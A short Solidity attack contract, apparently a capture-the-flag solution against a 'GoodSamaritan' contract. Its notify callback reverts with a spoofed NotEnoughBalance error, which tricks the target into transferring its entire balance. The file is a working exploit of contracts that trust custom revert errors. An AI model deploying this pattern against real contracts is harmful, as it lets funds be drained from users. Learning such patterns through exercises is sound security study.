// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {INotifyable, GoodSamaritan} from "./GoodSamaritan.sol";

contract Notifyable is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan public goodSamaritan;

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
